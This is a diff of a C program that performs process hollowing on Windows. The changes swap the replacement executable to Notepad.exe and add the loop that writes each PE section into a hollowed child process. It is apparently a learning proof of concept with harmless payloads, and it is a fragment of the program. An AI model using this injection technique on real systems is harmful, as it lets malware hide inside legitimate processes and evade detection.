@@ -51,7 +51,7 @@ int main()
 	printf("\nOpening the replacement executable.\n");
 
 	// Creating replacement executable to be ran
-	hFile = CreateFileW(L"C:/Users/wenqi/Desktop/MessageBox.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	hFile = CreateFileW(L"C:/Windows/System32/Notepad.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		printf("\nError: Unable to create the replacement executable. CreateFile failed with error %d\n", GetLastError());
 		NtTerminateProcess(pi.hProcess, 1);
@@ -90,6 +90,7 @@ int main()
 
 	// reads the base address of the executable image from the PEB of the child process by reading memory at an offset within the PEB, which is obtained from the Rdx register.
 	// The offset is calculated as sizeof(SIZE_T) * 2. The base variable stores the base address.
+	//base = nullptr;
 	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
 
 	// if the base address of the executable image matches the ImageBase specified in the PE header of the executable image, it proceeds to unmap the original executable image.
@@ -116,9 +117,10 @@ int main()
 	// after allocating memory, will try to write data from the executable to the original process
 	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);
 
-	// iterating through sections of the PE**
+	// iterating through sections of the PE line and writes it into the hollowed out memory of the original process
 	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
 		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
 	}
 
 	// set the eax register to the entry point of the injected image
